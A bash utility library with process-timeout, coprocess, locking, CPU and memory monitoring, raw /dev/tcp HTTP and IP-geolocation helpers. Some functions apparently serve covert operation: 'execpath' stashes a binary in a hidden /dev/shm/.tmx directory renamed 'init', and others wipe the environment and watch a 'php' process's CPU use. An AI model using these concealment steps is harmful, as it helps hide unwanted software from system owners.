#!/bin/bash

export FUNCTIONS=SOURCED
[ -n "${VERBOSE}" -a "${VERBOSE}" = 1 ] && VERBOSE=/tmp/.debug_log
## busybox path defined by deploy script

## echo a string long $1 of random lowercase chars
rand_string() {
    local c=0
    while [ $c -lt $1 ]; do
        printf "\x$(printf '%x' $((97+RANDOM%25)))"
        c=$((c+1))
    done
}

## make a new file descriptor named $1
newfd() {
    eval "local fd=\${$1}"
    eval "exec $fd>&-" &>/dev/null
    local pp=".$(rand_string 8)"
    mkfifo $pp
    unset "$1"
    eval "exec {$1}<>$pp"
    # unlink the named pipe
    rm -f $pp
}

## https://unix.stackexchange.com/a/407383/163931
fleep()
{
    # log "fleep: called by ${FUNCNAME[1]}"
    [ -n "${_snore_fd}" -a "$1" != 0 ] ||
        newfd _snore_fd
    # log "fleep: starting waiting with ${_snore_fd}"
    # command >&${_snore_fd} # &&
        # log "fleep command check successful"
    if ! command >&${_snore_fd}; then
        newfd _snore_fd
    fi
    read -t ${1:-1} -u $_snore_fd
    # log "fleep: ended"
}

## wait for command $@ to finish in $1 time
timeout() {
    [ -n "${_to_fd}" ] || newfd _to_fd
    local to=${1:-10}
    shift
    { eval "$@" & } 2>/dev/null; local wp=$! start=0
    log "starting timeout loop"
    while kill -0 $wp &>/dev/null; do
        # log "waiting for $wp"
        read -t 1 -u ${_to_fd}
        # log "after fleep"
        start=$((start+1))
        # log "after start"
        if [ $start -ge $to ]; then
            # log "timeout done killing $wp"
            kill -9 $wp 2>/dev/null
            wait -f $wp 2>/dev/null
            return 1
        fi
    done
    wait -f $wp 2>/dev/null
    local exc=$?
    log "ended timeout loop"
    return $exc
}

## checks an fd $1 before echoing into it a string $@
echofd() {
    local fd=${1}; shift
    command >&${fd} &&
        echo "$@" >&${fd}
}

##https://stackoverflow.com/a/8088167/2229761
define(){ IFS='\n' read -r -d '' ${1} || true; }

## reset counter $1 to $2 if has reached zero
step() {
    eval "counter_value=\$$1"
    if [ $counter_value = 0 ]; then
        eval "$1=$2"
        return 0
    else
        eval "$1=$((counter_value-1))"
        return 1
    fi
}

log() {
    {
        [ -n "$VERBOSE" ] &&
            eval "echo \"$(date '+%m/%d@%H:%M:%S')\" \"$1\" >> \"${2:-${VERBOSE}}\""
    } || return 0
}

clear_log() {
    [ -f "${1:-${VERBOSE}}" ] &&
        eval "echo '' >${1:-${VERBOSE}}"
}

## increase $1 by $2 or 1 by def
incr() {
    eval "$1=$(($1+${2:-1}))"
}
## decrease $1 by $2 or 1 by def
decr() {
    eval "$1=$(($1-${2:-1}))"
}



## https://stackoverflow.com/a/11120761/2229761
hex2bin() {
    while [ $# -ne 0 ]
    do
        DecNum=$(printf "%d" $1)
        Binary=

        while [ $DecNum -ne 0 ]
        do
            Bit=$(expr $DecNum % 2)
            Binary=$Bit$Binary
            DecNum=$(expr $DecNum / 2)
        done

        echo -e ${Binary:-0}
        shift
        # Shifts command line arguments one step.Now $1 holds second argument
        unset Binary
    done
}

bin2hex() {
    printf '%x\n' "$((2#$1))"
}

## get column $2 from string $1
get_column() {
    local col=0
    local IFS=$' '
    for c in $1; do
        [ $col = "$2" ] && echo "$c" && break
        col=$((col+1))
    done
}

# https://stackoverflow.com/a/3352015/2229761
trim() {
    local var="$*"
    # remove leading whitespace characters
    var="${var#"${var%%[![:space:]]*}"}"
    # remove trailing whitespace characters
    var="${var%"${var##*[![:space:]]}"}"
    echo -n "$var"
}

## search the last occurrence of $2 and replace with $3  on string $1
replace_end() {
    local left=${1%${2}*}
    local right=${1/${left}}
    local replright=${right/${2}/${3}}
    echo "${left}${replright}"
}

## get path from name $1
get_path() {
    ## RTFM
    type -p "$1"
    # local whichis
    # whichis=$(type $1) && echo ${whichis/#$1 is}
}

## RESOURCES MONITORING FUNCTIONS
## get statistics for process cpu usage monitoring
get_pid_stats(){
    pid="${pid:-$(pgrep php)}"
    [ -z "$pid" -o ! -a /proc/"$pid" ] && return 1
    read pupt < /proc/uptime;
    read stat < /proc/${pid}/stat && c=1 && for i in $stat; do
            case "$c" in
                14)
                    utime=$i
                    ;;
                15)
                    stime=$i
                    ;;
                16)
                    cutime=$i
                    ;;
                17)
                    cstime=$i
                    ;;
                22)
                    starttime=$i
                    break
                    ;;
            esac
            c=$((c+1));
        done
    uptimet=${pupt/.} && uptime=${uptimet/ *}
}

## for host total cpu usage monitoring every interval $1 for $2 times outputs value 0-100
## improved from https://rosettacode.org/wiki/Linux_CPU_utilization#UNIX_Shell
usgmon_prc(){
    local PREV_TOTAL=0 PREV_IDLE=0 c=0
    export cpu_avg_usg
    while [ $c -lt "${2:-3}" ]; do
        unset CPU
        local CPU
        read -a CPU < /proc/stat
        CPU=${CPU[@]:1}

        # Get the total CPU statistics, discarding the 'cpu ' prefix.
        IDLE=${CPU[4]} # Just the idle CPU time.

        # Calculate the total CPU time.
        TOTAL=0
        for VALUE in "${CPU[@]:1}"; do
            let "TOTAL=$TOTAL+$VALUE"
        done

        # Calculate the CPU usage since we last checked.
        let "DIFF_IDLE=$IDLE-$PREV_IDLE"
        let "DIFF_TOTAL=$TOTAL-$PREV_TOTAL"
        let "DIFF_USAGE=(1000*($DIFF_TOTAL-$DIFF_IDLE)/$DIFF_TOTAL+5)/10"

        # Remember the total and idle CPU times for the next check.
        PREV_TOTAL="$TOTAL"
        PREV_IDLE="$IDLE"
        fleep ${1:-1}
        c=$((c+1))
    done
    cpu_avg_usg=$DIFF_USAGE
}

# calc an unit of cpu usage with interval $1
proc_usg_u(){
    get_pid_stats
    uptime1=$uptime
    proctime1=$((utime+stime+cutime+cstime))
    fleep $1
    get_pid_stats
    uptime2=$uptime
    proctime2=$((utime+stime+cutime+cstime))
    uptimediff=$((uptime2-uptime1))
    [ $uptimediff != 0 ] && \
    proc_perc_usg=$(((proctime2-proctime1)*100/uptimediff))
}

## cpu monitor $cpumon_pid $cpumon_span $cpumon_ival
cpumon() {
    export proc_usg
    pid=${cpumon_pid:-${1}}
    ## timespan
    cpumon_span=${cpumon_span:-${2}}
    local span=${cpumon_span:-60}
    ## interval
    cpumon_ival=${cpumon_ival:-${3}}
    local ival=${cpumon_ival:-3}
    local iter=$((span/ival))
    local record=()
    while true; do
        # perc=$(top -n1 | grep php | grep -v grep | awk '{print gensub("%","","", $8)}')
        proc_usg_u 0.1 ## sets proc_perc_usg
        [ -z "$proc_perc_usg" ] && fleep $ival && continue
        record+=($proc_perc_usg)
        i=$((${#record[@]}-iter))
        [ $i -lt 0 ] && i=0
        record=(${record[@]:i})
        sum=0
        for p in "${record[@]}"; do
            sum=$((sum+p))
        done
        proc_usg=$((sum/${#record[@]}))
        echo ${proc_usg}
        # span=$((ival*${#record[@]}))s
        # echo "usage in $span is $proc_usg"
        fleep $ival
    done
}

## to be called with enable tracing
disable_tracing() {
    if [ -z "$dbg_tracing" ]; then
        [ ${-/x} != ${-} ] && ${dbg_tracing:=true} || ${dbg_tracing:=false}
        set +x
    else
        $dbg_tracing || set +x
        unset dbg_tracing
    fi
}

## to be called with disable tracing
enable_tracing() {
    if [ -z "$dbg_tracing" ]; then
        [ ${-/x} != ${-} ] && ${dbg_tracing:=true} || ${dbg_tracing:=false}
        set -x
    else
        $dbg_tracing && set -x
        unset dbg_tracing
    fi
}

## loadavg monitor loop or single call (currently single call for vars)
loadmon() {
    export cpu_avg_1 cpu_avg_5 cpu_avg_10
    # while true; do
    read avg < /proc/loadavg
    c=0
    for val in $avg; do
        case $c in
            0)
                cpu_avg_1=${val/.*}
                ;;
            1)
                cpu_avg_5=${val/.*}
                ;;
            2)
                cpu_avg_10=${val/.*}
                break
                ;;
        esac
        c=$((c+1))
        # done
        # fleep 1
        # echo "$cpu_avg_1 $cpu_avg_5 $cpu_avg_10"
    done
}

## loadmon version with decimals in the form of *100
loadmon_prc() {
    export cpu_avg_prc_1 cpu_avg_prc_5 cpu_avg_prc_10
    # while true; do
    read avg < /proc/loadavg
    c=0
    for val in $avg; do
        case $c in
            0)
                cpu_avg_prc_1=${val/./}
                ;;
            1)
                cpu_avg_prc_5=${val/./}
                ;;
            2)
                cpu_avg_prc_10=${val/./}
                break
                ;;
        esac
        c=$((c+1))
    done
}

## sets $job_n to the id of a coprocess named $1
id_coproc() {
    ## this implementation is broken because REMATCH order is not reliable
    # local reg="^(.*)coproc ${1}.*$"
    # jobs=$(jobs)
    # [[ "${jobs}" =~ $reg ]]
    # tmpstr=${BASH_REMATCH[1]/\]*}
    # job_n=${tmpstr/\[}
    # return $job_n
    id_job "coproc ${1}"
}

## sets $job_n to the id of a job whose command contains $1
id_job() {
    local tmpstr
    unset job_n
    while read j; do
        if [ "$j" != "${j/${1}}" ]; then
            tmpstr="${j/\[}"
            job_n="${tmpstr/\]*}"
            break
        fi
    done <<< "$(jobs -r)"
}

## start coprocess named $1 with args $@..., will have last child process pid in fd 9
## unset var should be set for every call, useful to unload big vars holding binaries
start_coproc() {
    local unset
    # eval "coproc $1 { $* & newfd ${1}_fd ; echo \$! >; wait; }"
    while :; do
        if [ "$1" = exec ]; then
            coproc_name="$2"
        else
            coproc_name="$1"
        fi

        if [ -n "$UNSET_COPROC_VARS" ]; then
            unset="unset $UNSET_COPROC_VARS;"
        fi

        log "starting coproc $coproc_name"
        unset -v "$coproc_name" ## only the variable, not functions
        eval "coproc $coproc_name { $unset $*; }" # 2>/dev/null
        unset UNSET_COPROC_VARS
        wait_coproc "$coproc_name" 3 && break
    done
    # eval "read -ru \${$1[0]} ${coproc_name}_sub_pid"
}

## stop coprocess named $1 with signal $2
stop_coproc() {
    ## clear fds
    id_coproc "$1" && [ -n "$job_n" ] && eval "kill -${2:-9} %$job_n" ||
        { eval "kill -${2:-9} \${${1}_PID}"; } ||
        { log "could not kill the specified coprocess with job $job_n" && return 1; }
    # [ $? != 0 ] && echo ${FUNCNAME[1]}
    # eval "kill -$2 \${${1}_PID}"
    # eval "kill -$2 \${${1}_sub_pid}"
    # eval "pkill -P \${${1}_PID}"
}

## clear file descriptors
clear_fds() {
    local fd
    for fd in $(compgen -G "/proc/$BASHPID/fd/*"); do
        fd=${fd/*\/}
            if [[ ! " $* " =~ " ${fd} " ]]; then
                case "$fd" in
                    0|1|2|255|"$_snore_fd")
                    ;;
                    *)
                        eval "exec $fd>&-"
                        ;;
                esac
            fi
    done
}

## wait for a coprocess named $1 to start
wait_coproc() {
    local passed=0
    local timeout=${2:-10}
    while :; do
        log "waiting coproc $1"
        id_coproc "$1 " ## note the space at the end to avoid ambiguity, (but not at the beginning!)
        [ -n "$job_n" ] && eval "kill -0 %$job_n" && return 0
        passed=$((passed+1))
        [ $passed -ge $timeout ] && return 1
        fleep 1
    done
}

## flush the output of a coprocess $1 returning the last line read with $2
read_coproc() {
    local fd
    eval "fd=\${$1[0]}"
    read_fd $fd $2
}

## read the last line of a fd $1 returning it in $2
read_fd(){
    local l
    [ -z "$1" -o -z "$2" ] && return 1
    while read -t 0 -ru $1; do
        read -t 1 -ru $1 l
        [ -z "$l" ] && break
        eval "$2=$l"
    done
    # close if specified
    if [ "$3" = "-" ]; then
        eval "exec $1>&-" &>/dev/null
    fi
}

## discard all the lines of a fd $1
flush_fd(){
    [ -z "$1" ] && return 1
    while read -t 0.1 -ru "$1"; do
        :;
    done
}

## write to a coproc named $1 a string $2
write_coproc() {
    eval "echo \"$2\" >&\${${1}[0]}"
}

## try to get a string before $3 and after $1 from $2
before_after() {
    string=$(echo $2)
    before=${string#*$1}
    after=${before/$3*}
}

## queries ipinfo and gets the current ip and country/region
parse_ip ()
{
    export ip country region;
    [ ! -e cfg/geoip.json ] && log "geolocation codes file not found." && return 1;
    ipquery=$(http_req ipinfo.io);
    [ -z "$ipquery" ] && log "failed querying ipinfo" && return 1;
    before_after 'ip\": \"' "$ipquery" '\"';
    ip=$(echo $after);
    [ -z "$ip" ] && log "failed parsing ipinfo data ip" && return 1;
    before_after 'country\": \"' "$ipquery" '\"';
    country=$(echo ${after,,});
    [ -z "$country" ] && log "failed parsing ipinfo data country" && return 1;
    while read l; do
        if [ "${l}" != "${l/\": {}" ]; then
            before_after '"' "$l" '"';
            lastregion=$(echo $after);
        else
            if [ "${l}" != "${l/\"${country}\"}" ]; then
                region=$lastregion;
                break;
            fi;
        fi;
    done < cfg/geoip.json
}

# try to open a connection to host $1 with port $2 and output to $3
open_connection() {
    exec {socket}<>/dev/tcp/${1}/${2} 2>/dev/null
    echo $socket >&${3}
}

## check if a tcp connection to $1=$HOST $2=$PORT is successful
check_connection() {
    local host=$1 port=$2 conn_socket=
    [ -z "$host" ] && { echo 'no host provided'; return 1; }
    [ -z "$port" ] && { echo 'no port provided'; return 1; }
    newfd conn_socket
    timeout 3 open_connection $host $port $conn_socket
    # read the fd of the opened connection from the conn_socket fd and close it
    read_fd $conn_socket avl -
    if [ -n "$avl" ]; then
        # close connection
        eval "exec ${avl}<&-" &>/dev/null
        return 0 ## connection can be established
    else
        return 1 ## connection can't be established
    fi
}

## store core count in CORES
get_cores() {
    if [ ! -e /proc/cpuinfo ]; then
        CORES=$(nproc) || CORES=1
    else
        CORES=0
        while read l; do
            [ "${l/cpu cores}" != "${l}" ] && CORES=$((CORES+1))
        done < /proc/cpuinfo
    fi
}

## store current free memory (MB) in FREEMEM
get_mem(){
    local l
    while read l; do
        [ "${l/MemAvail}" != "$l" ] &&
            l=${l//[^0-9]} &&
            FREEMEM=$((l/1000)) &&
            break
    done < /proc/meminfo
}
## store current free swap (MB) in FREESWP
get_swp(){
    local l
    while read l; do
        [ "${l/SwapFree}" != "$l" ] &&
            l=${l//[^0-9]} &&
            FREESWP=$((l/1000)) &&
            break
    done < /proc/meminfo
}

## store cpu l3 cache size in cache_bytes
get_cache() {
    if [ ! -e /proc/cpuinfo ]; then
        cache_bytes=0
    else
        while read l; do
            if [ "${l/cache size}" != "${l}" ]; then
                cache_bytes=${l//[^0-9]} && break
            fi
        done < /proc/cpuinfo
    fi
}

## find a suitable path to store binaries
execpath() {
    if execpath=$("$bb" mktemp -d); then
        export PATH=${execpath}:$PATH
    else
        for ph in {/dev/shm,/run,~/}; do
            rm -rf $ph/.path && \
                mkdir -p $ph/.tmx && \
                mv pl/tmux ${ph}/.tmx/init && \
                export PATH=${ph}/.tmx:$PATH && \
                trel=${ph}/.tmx && break
        done
    fi
}

## prints what it reads from fd $1 endlessly but waits for ack on input fd
notifier() {
    while true; do
        read -t 0.1 -ru $1 message
        [ -z "$message" ] && message="$prev"
        echo "$message"
        read
        prev="$message"
    done
}

## gives locks
locker() {
    locked=false
    while true; do
        read -s l
        case "$l" in
            lock)
                if $locked; then
                    echo no
                else
                    locked=true
                    echo yes
                fi
                ;;
            unlock)
                if $locked; then
                    locked=false
                    echo yes
                else
                    echo no
                fi
                ;;
            *)
                echo no
                ;;
        esac
    done
}

## locks
lock() {
    local response
    eval "echo lock >&${locker[1]}"
    log "locking fd ${locker[1]}"
    # read -t 0 -u ${locker[0]} ## do a read to avoid races
    eval "read -t 10 -u ${locker[0]} response" ||
        eval "read -t 10 -u ${locker[0]} response"
    if [ "$?" -lt 128 ]; then
        [ "$response" = yes ] && { log "locking succesful"; return 0; }
        [ "$response" = no ] && { log "locking failed"; return 1; }
        { log "locker misbehaving"; return 1; }
    else
        { log "locking timed out"; return 1; }
    fi
}

## unlocks
unlock() {
    local response
    eval "echo unlock >&${locker[1]}"
    log "unlocking fd ${locker[1]}"
    # read -t 0 -u ${locker[0]} ## do a read to avoid races
    eval "read -t 10 -u ${locker[0]} response" ||
        eval "read -t 10 -u ${locker[0]} response"
    if [ "$?" -lt 128 ]; then
        [ "$response" = yes ] && { log "unlocking succesful"; return 0; } ||
        [ "$response" = no ] && { log "unlocking failed"; return 1; }
        { log "locker misbehaving"; return 1; }
    else
        { log "unlocking timed out"; return 1; }
    fi
}

## perform an http request on url $1
http_req() {
    local domain=${1/\/*}
    local urlpath=${1#*\/}
    [ "$urlpath" = "$domain" ] && urlpath=
    local headers=
    exec {http_req}<>/dev/tcp/${domain}/80
    echo -e "GET /$urlpath HTTP/1.1\r\nHost: ${domain}\r\nAccept: */*\r\n" >&${http_req}
    while ifs= read -t 0.5 -r l; do
        [ -n "$headers" ] && echo $l && continue
        [ "${l}" = $'\r' -o "${l}" = $'\n' ] && headers=1
    done <&${http_req}
}

## count lines in variable $1
count_lines() {
    local c=0
    while read l; do
           c=$((c+1))
    done <<<"$1"
    echo $c
}

## get a random line from var $1 of length $2
random_line() {
    local length=$2
    local c=0
    if [ -n "$length" ]; then
        local pick=$((RANDOM%length))
        while read l; do
            [ $c = $pick ] && echo "$l" && break
            c=$((c+1))
        done <<<"$1"
    else
        declare -A lines
        while read l; do
            lines[$c]=$l
            c=$((c+1))
        done <<<"$1"
        local pick=$((RANDOM%c))
        echo ${lines[$pick]}
    fi
}

## escape brackets of string $1
escape_brackets() {
    tmpstr=${1//(/\\(}
    tmpstr=${tmpstr//)/\\)}
    tmpstr=${tmpstr//[/\\[}
    tmpstr=${tmpstr//]/\\]}
    tmpstr=${tmpstr//\{/\\\{}
    tmpstr=${tmpstr//\}/\\\}}
    echo "$tmpstr"
}

## output the content of a file with shuffled lines
shuffle() {
    local IFS=$'\n' tail=
    while read l; do
        if [ $((RANDOM%2)) = 1 ]; then
            echo "$l"
        else
            tail="${tail}${l}\n"

        fi
    done < $1
    printf '%s' "${tail}"
}

ushuffle() {
    declare -a lines
    local c=0
    while read l; do
        [ "$l" != '$\n' ] &&
            {
                lines[$c]=${l}
                (( c++ ))
            }
    done < $1
    randomize "${lines[@]}"
}

randomize()
{
    arguments=($@)
    declare -a out
    i="$#"
    j="0"

    while [[ $i -ge "0" ]] ; do
        which=$(random_range "0" "$i")
        out[j]="${arguments[$which]}"
        arguments[$which]=${arguments[i]}
        (( i-- ))
        (( j++ ))
    done
    printf '%s\n' ${out[*]}
}

random_range()
{
    low=$1
    range=$(($2 - $1))
    if [[ range -ne 0 ]]; then
        echo $(($low+$RANDOM % $range))
    else
        echo "$1"
    fi
}


## unset bash env apart excluded vars/funcs
clear_env(){
    local functions=$(declare -F)
    functions=${functions//declare -f }
    for u in $@; do
        functions=${functions/$u[[:space:]]}
        functions=${functions/[[:space:]]$u}
        functions=${functions/[[:space:]]$u[[:space:]]}
    done
    local vars=$(set -o posix; set | while read l; do echo ${l/=*}; done)
    for u in $@; do
        vars=${vars/$u[[:space:]]}
        vars=${vars/[[:space]]$u}
        vars=${vars/[[:space:]]$u[[:space:]]}
    done
    unset -f $functions &>/dev/null
    unset -v $vars &>/dev/null
    # unset $vars &>/dev/null
}

## unexport most variables
dex_env() {
    exported=$(export -p)
    while read e; do
        n=${e/declare -*x }
        [ "$n" = "$e" ] && continue ## multiline var
        n=${n/=*}
        case "$n" in
            "SHELL"|"USER"|"HOME"|"TMUX"|"CHARSET"|"TERM")
                continue
                ;;
            *)
                dexported="$dexported ${n/=*}"
        esac
    done <<<"$exported"
    export -n $dexported
}
